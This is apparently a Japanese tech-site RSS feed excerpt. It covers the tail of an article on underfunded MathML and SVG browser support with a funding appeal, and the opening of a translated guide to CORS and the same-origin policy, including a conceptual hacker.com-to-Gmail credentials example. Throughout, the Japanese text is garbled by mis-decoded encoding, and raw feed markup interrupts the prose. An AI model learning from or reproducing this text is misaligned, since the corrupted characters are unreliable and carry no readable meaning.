<p>ç­†è€…ã®ãƒ–ãƒ­ã‚°ã®èª­è€…ã‚„Igaliaç¤¾ã®ãƒãƒƒãƒ‰ã‚­ãƒ£ã‚¹ãƒˆã®ãƒªã‚¹ãƒŠãƒ¼ã¯ã€MathMLï¼ˆMathematical Markup Languageï¼‰ã¨SVGãŒãŠãã‚‰ãã“ã†ã—ãŸå•é¡Œã®æœ€ãŸã‚‹ä¾‹ã§ã‚ã‚‹ã“ã¨ã‚’ã”å­˜ã˜ã§ã—ã‚‡ã†ã€‚ã„ãšã‚Œã‚‚æœ€å¤ã®Webè¦æ ¼ã«æ•°ãˆã‚‰ã‚Œã€æœ€åˆã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚ŒãŸæ™‚æœŸã¯HTML4.0ã‚„CSS2ã¨é‡ãªã‚Šã¾ã™ã€‚HTMLãƒ‘ãƒ¼ã‚µãƒ¼ã«ç‰¹åˆ¥ã«çµ„ã¿è¾¼ã¾ã‚Œã€ç¾åœ¨ã¯HTML Living Standardï¼ˆ<a href="https://html.spec.whatwg.org/#mathml">MathML</a>ã€<a href="https://html.spec.whatwg.org/#svg-0">SVG</a>ï¼‰ã«çµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã„ãšã‚Œã‚‚æ­´å²çš„ã«å¤§å¹…ãªè³‡é‡‘ä¸è¶³ã®çŠ¶æ…‹ã«ã‚ã‚Šã€å®Ÿéš›ã®ä½œæ¥­ã®å¤§åŠã¯ãƒœãƒ©ãƒ³ãƒ†ã‚£ã‚¢ã‚„ç®¡ç†è€…ä»¥å¤–ã®çµ„ç¹”ãŒæ‹…ã£ã¦ã„ã¾ã™ã€‚26å¹´ãŒçµŒã£ãŸä»Šã‚‚ãªãŠã€æœ€å¾Œã®é‡è¦ãªä½œæ¥­ã«å–ã‚Šçµ„ã‚€æ±ºå¿ƒãŒã§ããªã„ã®ã§ã™ã€‚</p>
<p>ãã®ãŸã‚ã€Interopã«ã¯æ¯å¹´ä¸¡æ–¹ã«ã¤ã„ã¦è¦æœ›ãŒå¯„ã›ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>2024å¹´ã®ã€ŒState of HTMLã€ã‚¢ãƒ³ã‚±ãƒ¼ãƒˆã§ã¯ã€<a href="https://state-of-html-2024.onrender.com/en-US/features/content/">ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãŒæŒ™ã’ã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®èª²é¡Œ</a>ã¨ã—ã¦<code class="language-text">&lt;svg></code>ãŒãƒˆãƒƒãƒ—ã«é¸ã°ã‚Œã€ã€Œãƒ–ãƒ©ã‚¦ã‚¶ã‚µãƒãƒ¼ãƒˆã€ã«èµ·å› ã™ã‚‹èª²é¡Œã®å€è¿‘ãã®å¾—ç¥¨æ•°ã§ã—ãŸã€‚SVGã®ä»–ã®ä½¿ç”¨æ–¹æ³•ã¯å«ã‚ãšã€<code class="language-text">&lt;svg></code>è¦ç´ ã ã‘ã§ã‚‚<a href="https://rainy-periwinkle.glitch.me/permalink/831113a2f130c21a753ff9404067a47eaa893bc7fbc3f973a012d50e67123cf2.html">HTTPã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ãƒ‡ãƒ¼ã‚¿ã®HTMLãƒšãƒ¼ã‚¸ã®55%ä»¥ä¸Š</a>ã§ä½¿ã‚ã‚Œã¦ã„ã¾ã™ã€‚ç´„130å€‹ã‚ã‚‹HTMLã®è¦ç´ ã®ã†ã¡ã€<code class="language-text">&lt;svg></code>ã‚ˆã‚Šã‚‚ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹htmlè¦ç´ ã¯27å€‹ã ã‘ã§ã™ã€‚SVGã¯ã€Webã‚¨ãƒ³ã‚¸ãƒ³ã‚’åˆ©ç”¨ã™ã‚‹åŸ‹ã‚è¾¼ã¿ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚‚å¤šç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>æ•°å¼ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã¯ã€arXivã‚„Wikipediaãªã©ç„¡æ•°ã®æ•°å¼ã‚’ä½¿ç”¨ã™ã‚‹ç‰¹å®šã®ã‚µã‚¤ãƒˆã‚„ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³æ•™è‚²ã‚„æ›¸ç±ã«å¤šãè¦‹ã‚‰ã‚Œã¾ã™ã€‚HttpArchiveã®ã‚¯ãƒ­ãƒ¼ãƒ«ã¯ã€ä¸»ã«ã‚ã¾ã‚Šæ•°å¼ãŒä½¿ã‚ã‚Œãªã„ä¸€èˆ¬å‘ã‘ã®ãƒ›ãƒ¼ãƒ ãƒšãƒ¼ã‚¸ã‚’å¯¾è±¡ã«ã—ã¦ã„ã‚‹ãŸã‚ã€ãã®æ¸¬å®šã«ã¯ã‚ã¾ã‚Šå‘ã„ã¦ã„ã¾ã›ã‚“ã€‚ã—ã‹ã—ã‚¯ãƒ­ãƒ¼ãƒ«ã§ã‚‚ã€ãƒã‚¤ãƒ†ã‚£ãƒ–é–¢æ•°ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã§ã¯ãªãã‚®ãƒ£ãƒƒãƒ—ã®æ©‹æ¸¡ã—ã‚’è¡Œã†æœ€ã‚‚ä¸€èˆ¬çš„ãª2ã¤ã®JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã€å¤šãã®ãƒšãƒ¼ã‚¸ã§èª­ã¿è¾¼ã¾ã‚Œã‚‹ã®ã‚’è¦‹ã¾ã™ã€‚ã“ã‚Œã¯ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã«æ‚ªå½±éŸ¿ã‚’åŠã¼ã—ã¾ã™ãŒã€ç‰¹æ®Šãªå•é¡Œã§ã™ã€‚ãƒ†ã‚­ã‚¹ãƒˆã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã«JavaScriptã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚ã¾ãŸã€Adobe InDesignã‚„Microsoft Wordãªã©ã®å¤šãã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆç·¨é›†ãƒ„ãƒ¼ãƒ«ã‚‚MathMLã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã™ã§ã«å¤šãã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒè¦æ±‚ã•ã‚Œã‚‹è¤‡é›‘ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚ã‚Šã€ã‚‚ã—ã‚µãƒãƒ¼ãƒˆãŒä¸ååˆ†ãªå ´åˆã€ã•ã‚‰ã«å¤šãã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’èª­ã¿è¾¼ã‚€å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>Igaliaç¤¾ã¯ã€è³‡é‡‘æä¾›ã‚’å—ã‘ãªãŒã‚‰è‡ªç¤¾è³‡é‡‘ã‚‚æŠ•ã˜ã¦å®Ÿè£…ã‚„æ”¹å–„ã‚’è¡Œã£ã¦ãã¾ã—ãŸã€‚é–‹ç™ºã‚’å‰ã«é€²ã‚ã‚‹ãŸã‚ã«ã€ç§ãŸã¡ã¯æ¯å¹´ä¸€å®šã®å‡ºè³‡ã‚’è¡Œã£ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€ã“ã®æ–¹æ³•ã§ã¯é…ã€…ã¨ã—ã¦é€²ã¿ã¾ã›ã‚“ã€‚æœ€å¾Œã®ä½œæ¥­ã‚’æˆã—é‚ã’ã‚‹ãŸã‚ã«ã¯ã€å…±åŒã§ã®å–ã‚Šçµ„ã¿ãŒå¿…è¦ã§ã™ã€‚ãã†ã™ã‚Œã°ã€ã¯ã‚‹ã‹ã«é€Ÿã„ãƒšãƒ¼ã‚¹ã§å‰ã«é€²ã¿ã€å¤§ã„ã«æ”¹å–„ã§ãã‚‹ã¯ãšã§ã™ã€‚</p>
<p>ã“ã‚Œã‚‰ã®å•é¡Œã«é›†ä¸­çš„ã«å–ã‚Šçµ„ã¿ã€æ”¹å–„ã‚’æ¨ã—é€²ã‚ã‚‹è€ƒãˆã«è³›åŒã—ã¦ã„ãŸã ã‘ã‚‹æ–¹ã¯ã€ãœã²ç§ãŸã¡ã‚„ä»–ã®ãƒ™ãƒ³ãƒ€ãƒ¼ã«ã”é€£çµ¡ãã ã•ã„ã€‚åŠ›ã«ãªã£ã¦ã„ãŸã ã‘ã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<p>ã‚‚ã¡ã‚ã‚“ã€ãã†ç°¡å˜ã«ã¯è¡Œã‹ãªã„å¯èƒ½æ€§ã‚‚ã‚ã‚‹ã¨æ€ã„ã¾ã™ã€‚ã“ã‚Œã¾ã§ã¯ãã†ã§ã—ãŸã€‚ãƒ™ãƒ³ãƒ€ãƒ¼ä»¥å¤–ã®é–‹ç™ºè€…ãŒä½œæ¥­ã‚’è¡Œã†ã“ã¨ã‚„ã€å¤–éƒ¨ã‹ã‚‰ã®è³‡é‡‘æä¾›ãŒæœ‰åŠ¹ã§ã‚ã‚‹ã“ã¨ã¯å®Ÿè¨¼æ¸ˆã¿ã§ã™ã€‚Igaliaç¤¾ã¯ã“ã‚Œã‹ã‚‰ã‚‚åœ°é“ãªå–ã‚Šçµ„ã¿ã‚’ç¶šã‘ã¦ã„ãã¾ã™ãŒã€å¤–éƒ¨ã‹ã‚‰ã®è³‡é‡‘æä¾›ãŒãªã‘ã‚Œã°ã€è‡ªã‚‰ã®å‡ºè³‡ã ã‘ã§ã¯é™ç•ŒãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®å–ã‚Šçµ„ã¿ã®æ©æµã‚’å—ã‘ã‚‹ä¼æ¥­ã«ã¯ã€ä¸€éƒ¨ã®ä½œæ¥­ã¸ã®å‡ºè³‡ã‚’ã”æ¤œè¨ã„ãŸã ã‘ã‚‹ã¨ã‚ã‚ŠãŒãŸã„ã§ã™ã€‚ã‚‚ã—ãã¯ã€<a href="https://opencollective.com/mathml-core-support">MathMLã«é–¢ã™ã‚‹ä½œæ¥­ã«ç›´æ¥å‡ºè³‡</a>ã—ã¦ã„ãŸã ãã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚</p>]]></content:encoded></item><item><title><![CDATA[CORSã‚¬ã‚¤ãƒ‰ã®æ±ºå®šç‰ˆ]]></title><description><![CDATA[ç„¡å¢ãªä»”çŒ«ã®å†™çœŸã‚’é›†ã‚ãŸã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªå•ã—ãŸã¨æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã‹ã‚ã„ã„ä»”çŒ«é”ã®å†™çœŸã®èƒŒå¾Œã«ã¯ã€ã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®å¼·å¤§ãªåŠ›ãŒéš ã‚Œã¦ã„ã¾ã™ã€‚èª°ã‹ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ã‚µã‚¤ãƒˆã®ã‚ªãƒ¼ãƒŠãƒ¼ã¯â€¦]]></description><link>https://postd.cc/cors-the-ultimate-guide/</link><guid isPermaLink="false">https://postd.cc/cors-the-ultimate-guide/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[CORS]]></category><category><![CDATA[Ajax]]></category><pubDate>Fri, 24 Jan 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>ç„¡å¢ãªä»”çŒ«ã®å†™çœŸã‚’é›†ã‚ãŸã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªå•ã—ãŸã¨æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã‹ã‚ã„ã„ä»”çŒ«é”ã®å†™çœŸã®èƒŒå¾Œã«ã¯ã€ã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®å¼·å¤§ãªåŠ›ãŒéš ã‚Œã¦ã„ã¾ã™ã€‚èª°ã‹ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ã‚µã‚¤ãƒˆã®ã‚ªãƒ¼ãƒŠãƒ¼ã¯ãã®è¨ªå•è€…ã®ãƒãƒƒãƒˆä¸Šã®è¡Œå‹•ã«é–¢ã™ã‚‹ã‚ã‚‰ã‚†ã‚‹æƒ…å ±ã‚’å…¥æ‰‹ã§ãã¾ã™ã€‚ãã®ä¸­ã«ã¯ã€éŠ€è¡Œå–å¼•æƒ…å ±ã€SNSä¸Šã®æŠ•ç¨¿ã‚„ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€ãƒ¡ãƒ¼ãƒ«ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã®è³¼è²·ãƒ‡ãƒ¼ã‚¿ãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚ã‚ãªãŸãŒå—ã‘ã‚‹ä¿¡ç”¨é¢ã‚„é‡‘éŠ­é¢ã®æå®³ã¯ã©ã‚Œã»ã©ã®ã‚‚ã®ã«ãªã‚‹ã§ã—ã‚‡ã†ã‹ã€‚ã‚ãªãŸã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒæµå‡ºã—ã€éŠ€è¡Œå£åº§ã®ãŠé‡‘ãŒä½¿ã„è¾¼ã¾ã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã—ã‹ã—å¹¸ã„ãªã“ã¨ã«ã€å®Ÿéš›ã«ã¯ãã®ã‚ˆã†ãªçŠ¶æ³ã¯èµ·ã“ã‚Šã¾ã›ã‚“ã€‚ãã‚Œã¯ã€<a href="https://en.wikipedia.org/wiki/Same-origin_policy">SOP</a>ã¨CORSã®ãŠé™°ãªã®ã§ã™ã€‚</p>
<h3>ç›®æ¬¡</h3>
<ol>
<li>Ajaxï¼ˆAsynchronous JavaScript And XMLï¼‰</li>
<li>ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãŒã‚¸ãƒ£ãƒ³ã‚°ãƒ«ã§ã¯ãªã„ç†ç”±</li>
<li>èªè¨¼æƒ…å ±ã‚’ã€Œå«ã‚ã‚‹ã€vsã€Œå«ã‚ãªã„ã€</li>
<li>CORSãƒ«ãƒ¼ãƒ«ã®å®šç¾©</li>
<li>ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†
<ol>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã‹å¦ã‹</li>
<li>ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã‹æ‹’å¦ã™ã‚‹ã‹</li>
<li>CORSãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯</li>
</ol>
</li>
<li>CORSãƒãƒªã‚·ãƒ¼ã®èª¤è¨­å®šã«ã‚ˆã‚‹å±é™º</li>
<li>ãƒ‡ãƒ¢</li>
<li>å®‰å…¨ãªCORSãƒãƒªã‚·ãƒ¼ã‚’å®šç¾©ã™ã‚‹æ–¹æ³•</li>
<li>CSRFå¯¾ç­–ã¨ã—ã¦ã®CORSè¨­å®š</li>
<li>è¨­å®šãƒŸã‚¹ã§å¢“ç©´ã‚’æ˜ã‚‰ãªã„</li>
</ol>
<h2>Ajaxï¼ˆAsynchronous JavaScript And XMLï¼‰</h2>
<p>å°‘ã—å‰ã®æŠ€è¡“ã«ãªã‚Šã¾ã™ãŒã€çš†ã•ã‚“ãŒã‚ˆãã”å­˜çŸ¥ã®<a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a>ã«ã¤ã„ã¦ã¾ãšãŠè©±ã—ã¾ã™ã€‚Ajaxã¨ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®JavaScriptã®ä»•çµ„ã¿ã§ã™ã€‚ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ä¸€èˆ¬çš„ã«Ajaxã‚’ä½¿ç”¨ã—ã¦APIã‚µãƒ¼ãƒãƒ¼ã«æƒ…å ±ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã—ã¾ã™ã€‚Ajaxã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹éš›ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒAjaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€ãƒœãƒ–ã¨ã„ã†åå‰ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã®äº‹ä¾‹ã‚’æ¤œè¨ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<p>example.comã¨ã„ã†ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹éš›ã€Ajaxã«ã€Œèªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã€ã‚ˆã†ä¼ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒœãƒ–ãŒ<code class="language-text">example.com</code>ã«é–¢ã™ã‚‹Cookieã‚’ä¿å­˜ã—ã¦ã„ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ä¿å­˜ã—ã¦ã„ã‚‹å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚ˆã‚ŠCookieã‚’é€ä¿¡ã—ã¾ã™ã€‚ãƒœãƒ–ãŒexample.comä¸Šã§èªè¨¼ã•ã‚Œã‚Œã°ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ãƒœãƒ–ã‚’èªè­˜ã—ã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒœãƒ–ã®IDã§Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image-1-1024x350.png"></p>
<h2>ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãŒã‚¸ãƒ£ãƒ³ã‚°ãƒ«ã§ã¯ãªã„ç†ç”±</h2>
<p>ã‚ãªãŸãŒã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«ç†±å¿ƒã§ã‚ã‚Œã°ã€ã‚ã‚‹ç–‘å•ãŒæ€ã„æµ®ã‹ã‚“ã ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã™ãªã‚ã¡ã€ã‚‚ã—è‡ªåˆ†ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ãŸãªã‚‰ã°ã€èªè¨¼æƒ…å ±ã‚’<strong>å«ã‚ã¦</strong>Gmailã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€è¨ªå•è€…ã®ãƒ¡ãƒ¼ãƒ«ã‚’ã™ã¹ã¦å–å¾—ã™ã‚Œã°ã‚ˆã„ã®ã§ã¯ãªã„ã‹ã€ã¨ã„ã†ç–‘å•ã§ã™ã€‚</p>
<p>ã“ã®ç–‘å•ãŒæµ®ã‹ã‚“ã æ–¹ã¯ã€æ‚ªã®æ‰èƒ½ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã§ã™ãŒã€ãã®ä¼ã¿ã¯ã†ã¾ãè¡Œãã¾ã›ã‚“ã€‚<strong>SOP</strong>ã¨<strong>CORS</strong>ã¨ã„ã†2ã¤ã®ä»•çµ„ã¿ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚</p>
<p>SOPã¯Same Origin Policyã®ç•¥ã§ã€ã€ŒåŒä¸€ã‚ªãƒªã‚¸ãƒ³ãƒãƒªã‚·ãƒ¼ã€ã¨ã„ã†æ„å‘³ã§ã™ã€‚ã“ã®ä»•çµ„ã¿ã¯ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆAãŒã‚ªãƒªã‚¸ãƒ³ã®ç•°ãªã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆBã®ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚ãªã„ã‚ˆã†ã«ã™ã‚‹ã‚‚ã®ã§ã™ã€‚SOPã¯ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¨ã‚µã‚¤ãƒˆä¸Šã«ä¿å­˜ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‡ãƒ¼ã‚¿ãŒã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚ˆã£ã¦ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œãªã„ã‚ˆã†ä¿è­·ã—ã¾ã™ã€‚</p>
<p>CORSã¯Cross-Origin Resource Sharingã®ç•¥ã§ã€ã€Œã‚ªãƒªã‚¸ãƒ³é–“ãƒªã‚½ãƒ¼ã‚¹å…±æœ‰ã€ã¨ã„ã†æ„å‘³ã§ã™ã€‚CORSã¯ã€SOPã®ä»•çµ„ã¿ã«ä¾‹å¤–ã‚’è¿½åŠ ã§ãã‚‹ä¸€é€£ã®ãƒ«ãƒ¼ãƒ«ã§ã™ã€‚SOPã®ãƒãƒªã‚·ãƒ¼ã‚’ç·©ã‚ã‚‹ã“ã¨ã§ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆAãŒã‚ªãƒªã‚¸ãƒ³ã®ç•°ãªã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆBã‹ã‚‰ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>
<p>ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚¹ã‚­ãƒ¼ãƒ ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒ¼ãƒˆã®çµ„ã¿åˆã‚ã›ã§ã™ã€‚2ã¤ã®URLã®é–“ã§ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒç•°ãªã‚‹å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã‚ªãƒªã‚¸ãƒ³ãŒç•°ãªã‚‹ã¨ã¿ãªã—ã¾ã™ã€‚<a href="https://www.devsecurely.com/">https://www.devsecurely.com/</a>ã‚’ä¾‹ã«è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚ã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒä»¥ä¸‹ã®ã„ãšã‚Œã‹ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ãŸå ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ï¼ˆç•°ãªã‚‹ã‚ªãƒªã‚¸ãƒ³ï¼‰ã¨ã¿ãªã—ã¾ã™ã€‚</p>
<ul>
  <li><span style="color: red; font-weight: bold;">http</span>://www.devsecurely.com/</li>
  <li>https://<span style="color: red; font-weight: bold;">api</span>.devsecurely.com/</li>
  <li>https://www.<span style="color: red; font-weight: bold;">gmail</span>.com/</li>
  <li>https://www.devsecurely.com:<span style="color: red; font-weight: bold;">8443</span>/</li>
</ul>
<p>ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒã‚ªãƒªã‚¸ãƒ³ã®ç•°ãªã‚‹URLã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ãŸå ´åˆã€ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯<strong>ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆ</strong>ã¨ã¿ãªã•ã‚Œã¾ã™ã€‚<strong>åŒä¸€ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆ</strong>ã¨ã¯æ‰±ã„ãŒç•°ãªã‚Šã¾ã™ã€‚ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ‰±ã„æ–¹ã«é–¢ã™ã‚‹ãƒ«ãƒ¼ãƒ«ã¯è¤‡é›‘ã§ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€ã™ã¹ã¦ã®è¦ç´ ã¨ãƒ«ãƒ¼ãƒ«ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚æº–å‚™ã¯ã„ã„ã§ã™ã‹ï¼Ÿ</p>
<h2>èªè¨¼æƒ…å ±ã‚’ã€Œå«ã‚ã‚‹ã€vsã€Œå«ã‚ãªã„ã€</h2>
<p>ã¾ãšã¯èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã‹å¦ã‹ã§Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã©ã®ã‚ˆã†ãªå½±éŸ¿ãŒã‚ã‚‹ã®ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚æ˜ç¢ºåŒ–ã®ãŸã‚ã€<code class="language-text">https://hacker.com</code>ã‹ã‚‰<code class="language-text">https://gmail.com</code>ã«Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ä¾‹ã«ã¤ã„ã¦æ¤œè¨ã—ã¾ã™ã€‚</p>
<p>ã€Œèªè¨¼æƒ…å ±ã‚’å«ã‚ã‚‹ã€ã¯ã€Ajaxã§æœ‰åŠ¹åŒ–ã§ãã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã«å¯¾ã—ã€Gmailä¸Šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®Cookieã‚’Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å«ã‚ã‚‹ã‚ˆã†æŒ‡ç¤ºã—ã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€Gmailã¯ãƒœãƒ–ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰é€ã‚‰ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚ã‚‹ã¨åˆ†ã‹ã‚Šã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ã€ãƒœãƒ–ã®Gmailã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«é–¢é€£ã™ã‚‹æƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€<code class="language-text">https://gmail.com/emails</code>ã«å¯¾ã—ã¦Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã¨ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒœãƒ–ã®ãƒ¡ãƒ¼ãƒ«ãŒå«ã¾ã‚Œã¾ã™ã€‚</p>
